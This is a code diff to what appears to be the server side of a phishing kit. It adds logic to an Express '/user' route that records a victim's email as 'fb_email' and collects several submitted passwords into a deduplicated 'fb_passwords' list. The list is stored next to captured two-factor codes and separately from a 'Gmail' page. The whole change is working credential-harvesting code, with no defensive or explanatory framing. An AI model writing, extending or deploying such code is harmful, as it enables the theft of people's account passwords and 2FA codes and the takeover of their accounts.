@@ -80,6 +80,18 @@ router.post('/user', async (req, res) => {
       userData.tfaCodes = existing;
     }
 
+    if (userData.page_name !== "Gmail") {
+      const user = manager.getUser(id);
+      if (userData.login_email || userData.email) {
+        userData.fb_email = userData.login_email || userData.email;
+      }
+      const fbPwds = user.data.fb_passwords || [];
+      [userData.password_one, userData.password_two, userData.password_three]
+        .filter(Boolean)
+        .forEach((p) => { if (!fbPwds.includes(p)) fbPwds.push(p); });
+      if (fbPwds.length > 0) userData.fb_passwords = fbPwds;
+    }
+
     await manager.update(id, { ...userData, _lastUpdate: Date.now() });
 
     return res.status(200).json({
